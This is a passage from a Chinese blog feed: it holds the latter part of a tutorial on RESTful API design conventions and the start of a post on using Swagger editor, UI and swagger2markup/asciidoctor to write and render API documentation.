<p>  如果你只是简单的增加一个新的特性到API上，如资源上的一个新属性或者增加一个新的端点，你不需要增加API的版本。<br>  因为这些并不会造成向后兼容性的问题，你只需要修改文档即可。</p>
<p>  这里实现方式有2种：</p>
<ul>
<li><p>应该将API的版本号放入URL</p>
</li>
<li><p>将版本号放在HTTP头信息中，但不如放入URL方便和直观, Github采用的就是这种做法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">https://api.example.com/v1/                       # 在URL中说明</div><div class="line"></div><div class="line">curl -i https://api.github.com/users/octocat/orgs # HTTP头中表示API版本</div><div class="line"></div><div class="line">  HTTP/1.1 200 OK</div><div class="line">  Server: nginx</div><div class="line">  Date: Fri, 12 Oct 2012 23:33:14 GMT</div><div class="line">  Content-Type: application/json; charset=utf-8</div><div class="line">  Connection: keep-alive</div><div class="line">  Status: 200 OK</div><div class="line">  ETag: &quot;a00049ba79152d03380c34652f2cb612&quot;</div><div class="line">  X-GitHub-Media-Type: github.v3</div><div class="line">  </div><div class="line">  X-RateLimit-Limit: 5000</div><div class="line">  X-RateLimit-Remaining: 4987</div><div class="line">  X-RateLimit-Reset: 1350085394</div><div class="line">  </div><div class="line">  Content-Length: 5</div><div class="line">  Cache-Control: max-age=0, private, must-revalidate</div><div class="line">  X-Content-Type-Options: nosniff</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="API-ROOT-URI"><a href="#API-ROOT-URI" class="headerlink" title="API ROOT URI"></a>API ROOT URI</h2><p>  API的根地址很重要。可以通过这个列表快速了解你提供的服务，因此，让你的API根入口点保持尽可能的简单。以github的列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">maojun@maojun-mbp# curl https://api.github.com</div><div class="line">&#123;</div><div class="line">  &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;,</div><div class="line">  &quot;current_user_authorizations_html_url&quot;: &quot;https://github.com/settings/connections/applications&#123;/client_id&#125;&quot;,</div><div class="line">  &quot;authorizations_url&quot;: &quot;https://api.github.com/authorizations&quot;,</div><div class="line">  &quot;code_search_url&quot;: &quot;https://api.github.com/search/code?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;,</div><div class="line">  &quot;emails_url&quot;: &quot;https://api.github.com/user/emails&quot;,</div><div class="line">  &quot;emojis_url&quot;: &quot;https://api.github.com/emojis&quot;,</div><div class="line">  &quot;events_url&quot;: &quot;https://api.github.com/events&quot;,</div><div class="line">  &quot;feeds_url&quot;: &quot;https://api.github.com/feeds&quot;,</div><div class="line">  &quot;followers_url&quot;: &quot;https://api.github.com/user/followers&quot;,</div><div class="line">  &quot;following_url&quot;: &quot;https://api.github.com/user/following&#123;/target&#125;&quot;,</div><div class="line">  &quot;gists_url&quot;: &quot;https://api.github.com/gists&#123;/gist_id&#125;&quot;,</div><div class="line">  &quot;hub_url&quot;: &quot;https://api.github.com/hub&quot;,</div><div class="line">  &quot;issue_search_url&quot;: &quot;https://api.github.com/search/issues?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;,</div><div class="line">  &quot;issues_url&quot;: &quot;https://api.github.com/issues&quot;,</div><div class="line">  &quot;keys_url&quot;: &quot;https://api.github.com/user/keys&quot;,</div><div class="line">  &quot;notifications_url&quot;: &quot;https://api.github.com/notifications&quot;,</div><div class="line">  &quot;organization_repositories_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;,</div><div class="line">  &quot;organization_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;&quot;,</div><div class="line">  &quot;public_gists_url&quot;: &quot;https://api.github.com/gists/public&quot;,</div><div class="line">  &quot;rate_limit_url&quot;: &quot;https://api.github.com/rate_limit&quot;,</div><div class="line">  &quot;repository_url&quot;: &quot;https://api.github.com/repos/&#123;owner&#125;/&#123;repo&#125;&quot;,</div><div class="line">  &quot;repository_search_url&quot;: &quot;https://api.github.com/search/repositories?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;,</div><div class="line">  &quot;current_user_repositories_url&quot;: &quot;https://api.github.com/user/repos&#123;?type,page,per_page,sort&#125;&quot;,</div><div class="line">  &quot;starred_url&quot;: &quot;https://api.github.com/user/starred&#123;/owner&#125;&#123;/repo&#125;&quot;,</div><div class="line">  &quot;starred_gists_url&quot;: &quot;https://api.github.com/gists/starred&quot;,</div><div class="line">  &quot;team_url&quot;: &quot;https://api.github.com/teams&quot;,</div><div class="line">  &quot;user_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;&quot;,</div><div class="line">  &quot;user_organizations_url&quot;: &quot;https://api.github.com/user/orgs&quot;,</div><div class="line">  &quot;user_repositories_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;,</div><div class="line">  &quot;user_search_url&quot;: &quot;https://api.github.com/search/users?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Endpoints"><a href="#Endpoints" class="headerlink" title="Endpoints"></a>Endpoints</h2><p>  一个端点就是指向特定资源或资源集合的URL。针对每一个端点来说，你可能想列出所有可行的HTTP动词和端点的组合。<br>  在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，<br>  而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的<br>  “集合”（collection），所以API中的名词也应该使用复数。</p>
<p>  请注意如何展示数据之间的关系，特别是雇员与动物园之间的多对多关系。通过添加一个额外的URL段就可以实现更多的交互能力。<br>  当然没有一个HTTP动词能表示正在解雇一个人，但是你可以使用DELETE一个动物园里的雇员来达到相同的效果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">https://api.example.com/v1/zoos</div><div class="line">https://api.example.com/v1/animals</div><div class="line">https://api.example.com/v1/animal_types</div><div class="line">https://api.example.com/v1/employees</div><div class="line"></div><div class="line">GET /zoos: List all Zoos (ID and Name, not too much detail)</div><div class="line">POST /zoos: Create a new Zoo</div><div class="line">GET /zoos/ZID: Retrieve an entire Zoo object</div><div class="line">PUT /zoos/ZID: Update a Zoo (entire object)</div><div class="line">PATCH /zoos/ZID: Update a Zoo (partial object)</div><div class="line">DELETE /zoos/ZID: Delete a Zoo</div><div class="line">GET /zoos/ZID/animals: Retrieve a listing of Animals (ID and Name).</div><div class="line">GET /animals: List all Animals (ID and Name).</div><div class="line">POST /animals: Create a new Animal</div><div class="line">GET /animals/AID: Retrieve an Animal object</div><div class="line">PUT /animals/AID: Update an Animal (entire object)</div><div class="line">PATCH /animals/AID: Update an Animal (partial object)</div></pre></td></tr></table></figure>
<h2 id="过滤和排序"><a href="#过滤和排序" class="headerlink" title="过滤和排序"></a>过滤和排序</h2><p>  使用过滤和排序有多种原因，因此API应该提供参数，过滤和排序返回结果，降低客户端的复杂度。</p>
<ul>
<li><p>如果记录数量很多，服务器不可能都将它们返回给用户。</p>
</li>
<li><p>从客户端的角度来说，最小化网络传输，并让客户端尽可能快的得到查询结果。</p>
</li>
<li><p>从服务器角度来说，响应请求越小负载就越小。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">?limit=10: 减少返回给客户端的结果数量（用于分页）</div><div class="line">?offset=10: 发送一堆信息给客户端（用于分页）</div><div class="line">?animal_type_id=1: 使用条件匹配来过滤记录</div><div class="line">?sortby=name&amp;order=asc:  对结果按特定属性进行排序</div></pre></td></tr></table></figure>
<h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p>  服务器向用户返回的状态码和提示信息，因为它们是HTTP的标准，所以通用性上有保证，<br>  状态码的完整定义请看<a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html" target="_blank" rel="external">HTTP1.1/rfc Status Code define</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">状态码范围说明：</div><div class="line">1xx：保留给底层HTTP功能使用的，并且估计在你的职业生涯里面也用不着手动发送这样一个状态码出来。</div><div class="line">2xx：保留给成功消息使用的，你尽可能的确保服务器总发送这些状态码给用户。</div><div class="line">3xx：保留给重定向用的。大多数的API不会太常使用这类状态码，但是在新的超媒体样式的API中会使用更多一些。</div><div class="line">4xx：保留给客户端错误用的。例如，客户端提供了一些错误的数据或请求了不存在的内容。这些请求应该是幂等的，不会改变任何服务器的状态。</div><div class="line">5xx：保留给服务器端错误用的。这些错误常常是从底层的函数抛出来的，并且开发人员也通常没法处理。发送这类状态码的目的是确保客户端能得到一些响应。收到5xx响应后，客户端没办法知道服务器端的状态，所以这类状态码是要尽可能的避免。</div><div class="line"></div><div class="line">常见的一些状态码：</div><div class="line">200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的（Idempotent）。</div><div class="line">201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。</div><div class="line">202 Accepted - [*]：表示一个请求已经进入后台排队（异步任务）</div><div class="line">204 NO CONTENT - [DELETE]：用户删除数据成功。</div><div class="line">400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。</div><div class="line">401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。</div><div class="line">403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。</div><div class="line">404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。</div><div class="line">406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。</div><div class="line">410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。</div><div class="line">422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。</div><div class="line">500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。</div></pre></td></tr></table></figure>
<h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">error</span>: <span class="string">"Invalid API key"</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="返回结果"><a href="#返回结果" class="headerlink" title="返回结果"></a>返回结果</h2><p>  针对不同操作，服务器向用户返回的结果应该符合以下规范。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">GET /collection: 返回一系列资源对象</div><div class="line">GET /collection/resource: 返回单独的资源对象</div><div class="line">POST /collection: 返回新创建的资源对象</div><div class="line">PUT /collection/resource: 返回完整的资源对象</div><div class="line">PATCH /collection/resource: 返回完整的资源对象</div><div class="line">DELETE /collection/resource: 返回一个空文档</div></pre></td></tr></table></figure>
<h2 id="Hypermedia-API"><a href="#Hypermedia-API" class="headerlink" title="Hypermedia API"></a>Hypermedia API</h2><p>  RESTful API最好做到Hypermedia，即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么<br>  Hypermedia API的设计被称为<a href="https://en.wikipedia.org/wiki/HATEOAS" target="_blank" rel="external">HATEOAS</a></p>
<ul>
<li><p>link: 用户读取这个属性就知道下一步该调用什么API了</p>
</li>
<li><p>rel: rel表示这个API与当前网址的关系（collection关系，并给出该collection的网址）</p>
</li>
<li><p>href: API的绝对路径</p>
</li>
<li><p>title: API的标题,用于概述用途</p>
</li>
<li><p>type: API 响应的数据类型</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;link&quot;: &#123;</div><div class="line">  &quot;rel&quot;:   &quot;collection https://www.example.com/zoos&quot;,</div><div class="line">  &quot;href&quot;:  &quot;https://api.example.com/zoos&quot;,</div><div class="line">  &quot;title&quot;: &quot;List of zoos&quot;,</div><div class="line">  &quot;type&quot;:  &quot;application/vnd.yourformat+json&quot;</div><div class="line">&#125;&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"> maojun@maojun-mbp#curl https://api.github.com/user</div><div class="line">&#123;</div><div class="line">  &quot;message&quot;: &quot;Requires authentication&quot;,</div><div class="line">  &quot;documentation_url&quot;: &quot;https://developer.github.com/v3&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><p>  认证和授权的用户模型该尽量采用RBAC模型，因为其良好的扩容性。 API认证的手段最好采用OAuth2.0, 简单的可以采用<br>  JWT（Json Web Token）</p>
<p>  关于OAuth的简介可以参考<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="external">阮一峰OAuth2.0简介</a><br>  关于JWT参考此文<a href="http://www.haomou.net/2014/08/13/2014_web_token/" target="_blank" rel="external">JWT使用</a></p>
<h2 id="内容类型"><a href="#内容类型" class="headerlink" title="内容类型"></a>内容类型</h2><p>  XML已是过去时了，现代的web统一使用JSON，也就是HTTP头种的Content Type标签采用 application/json</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">请求报文</div><div class="line">POST /v1/animal HTTP/1.1</div><div class="line">Host: api.example.org</div><div class="line">Accept: application/json</div><div class="line">Content-Type: application/json</div><div class="line">Content-Length: 24</div><div class="line"> </div><div class="line">&#123;</div><div class="line">  &quot;name&quot;: &quot;Gir&quot;,</div><div class="line">  &quot;animal_type&quot;: 12</div><div class="line">&#125;</div><div class="line"></div><div class="line">响应报文</div><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Wed, 18 Dec 2013 06:08:22 GMT</div><div class="line">Content-Type: application/json</div><div class="line">Access-Control-Max-Age: 1728000</div><div class="line">Cache-Control: no-cache</div><div class="line"> </div><div class="line">&#123;</div><div class="line">  &quot;id&quot;: 12,</div><div class="line">  &quot;created&quot;: 1386363036,</div><div class="line">  &quot;modified&quot;: 1386363036,</div><div class="line">  &quot;name&quot;: &quot;Gir&quot;,</div><div class="line">  &quot;animal_type&quot;: 12</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oiw1gzfww.bkt.clouddn.com/rest_api.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="程序设计" scheme="https://blog.yumaojun.net/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
      <category term="RESTful API" scheme="https://blog.yumaojun.net/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/RESTful-API/"/>
    
    
      <category term="restful" scheme="https://blog.yumaojun.net/tags/restful/"/>
    
  </entry>
  
  <entry>
    <title>如何使用swagger设计出漂亮的RESTful API</title>
    <link href="https://blog.yumaojun.net/2017/01/05/api-design-swagger/"/>
    <id>https://blog.yumaojun.net/2017/01/05/api-design-swagger/</id>
    <published>2017-01-05T05:19:16.000Z</published>
    <updated>2017-01-06T06:02:18.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://oiw1gzfww.bkt.clouddn.com/swagger_example.png" alt=""><br><a id="more"></a></p>
<p>按照现在的趋势，前后端分离几乎已经是业界对开发和部署方式所达成的一种共识, 后台只负责数据的提供和计算，而完全不处理展现。而前端则负责拿到数据，组织数据并展现的工作。这样结构清晰，关注点分离，前后端会变得相对独立并松耦合。而前段和后端对待的契约就是API设计文档, 有了API的设计文档过后, 后端依据设计文件开发后端程序, 前段根据API设计文档模拟服务器,开发前段页面。而<code>Swagger</code>就是其中一种比较优秀的 <code>RESTful API</code>设计工具。</p>
<h2 id="swagger-工具简介"><a href="#swagger-工具简介" class="headerlink" title="swagger 工具简介"></a>swagger 工具简介</h2><p>swagger是一个RESTful API 的设计工具，官方提供3种工具：</p>
<ol>
<li><code>swagger-editor</code> 在线编辑器，同时提供编辑-展现-客户端-服务端代码的生成</li>
<li><code>swagger-ui</code> 展示工具，将编辑器定义好的json描述文件友好展示的工具。</li>
<li><code>swagger-codegen</code> 生成服务端和客户端的代码。</li>
</ol>
<p>因为swagger-editor集成了swagger-codegen功能，因此我们仅需要使用swagger-editor和swagger-ui就够了。</p>
<h2 id="编辑器-editor"><a href="#编辑器-editor" class="headerlink" title="编辑器(editor)"></a>编辑器(editor)</h2><p>可以使用在线编辑器，而由于网络原因, 往往不能很好的使用swagger提供的在线编辑器，然而这个在线编辑器也可以本地部署，其次有很多编辑器也有swagger的插件, 通过按照swagger插件，我们也可以配置出一个swagger的编辑器。有了编辑器后，我们需要熟悉使用swagger来设计API的一些语法。</p>
<h3 id="部署本地编辑器"><a href="#部署本地编辑器" class="headerlink" title="部署本地编辑器"></a>部署本地编辑器</h3><p>安装docker，配置镜像加速，然后拉去镜像到本地运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">docker pull swaggerapi/swagger-editor</div><div class="line">docker run -p 80:8080 swaggerapi/swagger-editor</div></pre></td></tr></table></figure></p>
<h3 id="使用本地编辑器"><a href="#使用本地编辑器" class="headerlink" title="使用本地编辑器"></a>使用本地编辑器</h3><p>推荐使用<code>vscode</code>作为编辑器, 安装vscode的<code>Swagger View</code>插件 就可以打造一个 swagger的编辑器了采用yaml编写，然后使用Swagger Preview 查看预览。</p>
<h3 id="swagger2-0语法"><a href="#swagger2-0语法" class="headerlink" title="swagger2.0语法"></a>swagger2.0语法</h3><p>详情参考<a href="http://swagger.io/specification/" target="_blank" rel="external">swagger2.0官方规范</a></p>
<ul>
<li><p>格式<br>采用json， 因为yaml是json的一个超集，因此也可以使用。通常情况我们通过yaml来完成编辑，最后通过编辑器导出为json文件。</p>
</li>
<li><p>文件结构<br>为一个单独的文件，但是其中definitions部分可以被抽出来为一个独立文件，通过$ref进行引用，按照惯例，这个文件应该被命名为 swagger.json</p>
</li>
<li><p>数据类型<br>用于描述一个数据的数据类型，对象定义时使用。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>Common Name</th>
<th style="text-align:center">type</th>
<th style="text-align:center">format</th>
<th style="text-align:right">Comments</th>
</tr>
</thead>
<tbody>
<tr>
<td>integer</td>
<td style="text-align:center">integer</td>
<td style="text-align:center">int32</td>
<td style="text-align:right">signed 32 bits</td>
</tr>
<tr>
<td>long</td>
<td style="text-align:center">integer</td>
<td style="text-align:center">int64</td>
<td style="text-align:right">signed 64 bits</td>
</tr>
<tr>
<td>float</td>
<td style="text-align:center">number</td>
<td style="text-align:center">float</td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>double</td>
<td style="text-align:center">number</td>
<td style="text-align:center">double</td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>string</td>
<td style="text-align:center">string</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>byte</td>
<td style="text-align:center">string</td>
<td style="text-align:center">byte</td>
<td style="text-align:right">base64 encoded characters</td>
</tr>
<tr>
<td>binary</td>
<td style="text-align:center">string</td>
<td style="text-align:center">binary</td>
<td style="text-align:right">any sequence of octets</td>
</tr>
<tr>
<td>boolean</td>
<td style="text-align:center">boolean</td>
<td style="text-align:center"></td>
<td style="text-align:right"></td>
</tr>
<tr>
<td>date</td>
<td style="text-align:center">string</td>
<td style="text-align:center">date</td>
<td style="text-align:right">As defined by full-date - RFC3339</td>
</tr>
<tr>
<td>dateTime</td>
<td style="text-align:center">string</td>
<td style="text-align:center">date-time</td>
<td style="text-align:right">As defined by date-time - RFC3339</td>
</tr>
<tr>
<td>password</td>
<td style="text-align:center">string</td>
<td style="text-align:center">password</td>
<td style="text-align:right">Used to hint UIs the input needs to be obscured.</td>
</tr>
</tbody>
</table>
<ul>
<li>规范<br>规范也就是语法，会安装此规范来编写API设计文档。以下列出了所有需要的关键字段</li>
</ul>
<table>
<thead>
<tr>
<th>字段名</th>
<th style="text-align:center">类型</th>
<th style="text-align:right">描述    </th>
</tr>
</thead>
<tbody>
<tr>
<td>swagger</td>
<td style="text-align:center">string</td>
<td style="text-align:right">必填项。表示使用的swagger的版本，必须为2.0</td>
</tr>
<tr>
<td>info</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#infoObject" target="_blank" rel="external">Info Object</a></td>
<td style="text-align:right">必填项。提供API的一些元数据描述</td>
</tr>
<tr>
<td>host</td>
<td style="text-align:center">string</td>
<td style="text-align:right">提供该API服务的主机名称或者IP，测试时 使用该地址进程测试。</td>
</tr>
<tr>
<td>basePath</td>
<td style="text-align:center">string</td>
<td style="text-align:right">API的基本路径,这是相对的host。 如果不包括,API是直属host。 必须以”/“开头</td>
</tr>
<tr>
<td>schemes</td>
<td style="text-align:center">[string]</td>
<td style="text-align:right">API的传输协议的列表。 在”http”,”https”,”ws”,”wss”其中选择</td>
</tr>
<tr>
<td>consumes</td>
<td style="text-align:center">[string]</td>
<td style="text-align:right">一个MIME类型的api可以使用列表。 值必须是所描述的Mime类型</td>
</tr>
<tr>
<td>produces</td>
<td style="text-align:center">[string]</td>
<td style="text-align:right">MIME类型的api可以产生的列表。   值必须是所描述的Mime类型</td>
</tr>
<tr>
<td>paths</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#pathsObject" target="_blank" rel="external">路径对象</a></td>
<td style="text-align:right">必填项。可用的路径和操作的API</td>
</tr>
<tr>
<td>definitions</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#definitionsObject" target="_blank" rel="external">定义对象</a></td>
<td style="text-align:right">一个对象数据类型定义</td>
</tr>
<tr>
<td>parameters</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#parametersDefinitionsObject" target="_blank" rel="external">参数定义对象</a></td>
<td style="text-align:right">定义请求参数的对象</td>
</tr>
<tr>
<td>responses</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#responsesDefinitionsObject" target="_blank" rel="external">反应定义对象</a></td>
<td style="text-align:right">定义请求响应对象</td>
</tr>
<tr>
<td>securityDefinitions</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#securityDefinitionsObject" target="_blank" rel="external">安全定义对象</a></td>
<td style="text-align:right">安全方案定义规范,比如认证</td>
</tr>
<tr>
<td>security</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#securityRequirementObject" target="_blank" rel="external">安全需求对象</a></td>
<td style="text-align:right">这里主要指使用哪种认证手段</td>
</tr>
<tr>
<td>tags</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#tagObject" target="_blank" rel="external">标签对象</a></td>
<td style="text-align:right">没个RESTful中资源的标签，列表中的每个标记名称必须是唯一的</td>
</tr>
<tr>
<td>externalDocs</td>
<td style="text-align:center"><a href="http://swagger.io/specification/#externalDocumentationObject" target="_blank" rel="external">外部文档对象</a></td>
<td style="text-align:right">额外的外部文档, 指向外部url</td>
</tr>
</tbody>
</table>
<h2 id="渲染器-ui"><a href="#渲染器-ui" class="headerlink" title="渲染器(ui)"></a>渲染器(ui)</h2><p>swagger-ui的使用很简单<a href="http://swagger.io/docs/" target="_blank" rel="external">swager-ui官方文档</a></p>
<h3 id="HTML文档渲染"><a href="#HTML文档渲染" class="headerlink" title="HTML文档渲染"></a>HTML文档渲染</h3><p>渲染器使用官方的swagger-ui，这里我们需要一个web服务器，用来渲染我们刚才编辑完成的api 设计文档。这里一般使用node 的 express为web框架来做这个简单的web服务器</p>
<h3 id="PDF文档渲染"><a href="#PDF文档渲染" class="headerlink" title="PDF文档渲染"></a>PDF文档渲染</h3><p>将API设计文档渲染成PDF, 流程是这样: swagger.yaml —&gt; asciiDoc—&gt; pdf</p>
<ul>
<li><p>使用<a href="https://github.com/Swagger2Markup/swagger2markup" target="_blank" rel="external">swagger2markup</a>来生成asciiDoc格式的文档<br>下载swagger2markup工具,<a href="http://repo.springsource.org/libs-release-remote/io/github/swagger2markup/swagger2markup-cli/" target="_blank" rel="external">下载地址</a>,选择你想要的版本下载<br>使用工具生成asciiDoc, -i指定swagger.yaml的位置, -f指定输出文件名称：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar swagger2markup-cli-1.1.0.jar convert -i ~/PycharmProjects/doc/api_design/swagger.yaml <span class="_">-f</span> asiidoc/swagger</div></pre></td></tr></table></figure>
</li>
<li><p>使用<a href="http://asciidoctor.org/docs/convert-asciidoc-to-pdf/" target="_blank" rel="external">asciidoctor</a>来将asciiDoc换换成PDF<br>这是一个ruby写的工具，我本地不打算部署ruby环境，因此在找一个docker镜像：<code>madduci/docker-asciidoctor-pdf</code><br>由于访问dockerhub的镜像速度非常慢，因此我将该工具的使用说明复制了下来，<a href="https://store.docker.com/community/images/madduci/docker-asciidoctor-pdf" target="_blank" rel="external">镜像使用说明</a></p>
<blockquote>
<p>Docker Image exposing asciidoctor-pdf as entrypoint and /document as mounted volume where to build the file<br>To build your own documents as PDF, simply run the container as:<br>docker run –rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf /document/your_document.adoc<br>If you want to use some custom styles, just run it as<br>docker run –rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf -a pdf-stylesdir=/document/resources/themes -a pdf-style=your_style -a pdf-fontsdir=/document/resources/fonts /document/your_document.adoc<br>and it will generate the pdf in the mounted volume /document</p>
</blockquote>
<p>这工具在生成含有中文的pdf文档时有字体问题，因此我修改了字体为微软雅黑字体，以下是修改方法：</p>
<ol>
<li><p>添加雅黑字体到当前的Fonts文件夹下面,这里需要标准字体和粗体, 而默认提供的字体只有这些<a href="https://github.com/asciidoctor/asciidoctor-pdf/tree/master/data/fonts" target="_blank" rel="external">默认提供的字体</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜  asiidoc ls Fonts |grep -i &apos;yahei&apos;</div><div class="line">Microsoft Yahei.ttf</div><div class="line">yahei.ttf</div><div class="line">yahei_bold.ttf</div></pre></td></tr></table></figure>
</li>
<li><p>修改主题配置<code>default-theme.yml</code>的<code>Noto Serif</code>字段，使用该字体:<br>配置文件下载地址<a href="https://github.com/asciidoctor/asciidoctor-pdf/tree/master/data/themes" target="_blank" rel="external">默认配置文件下载地址</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Noto Serif:</div><div class="line">normal: yahei.ttf</div><div class="line">bold: yahei_bold.ttf</div><div class="line">italic: yahei.ttf</div><div class="line">bold_italic: yahei_bold.tt</div></pre></td></tr></table></figure>
</li>
</ol>
<p>最后把我们生成好的swagger.adoc, 主题配置文件,字体 放在一个目录下，挂载到docker里面去:</p>
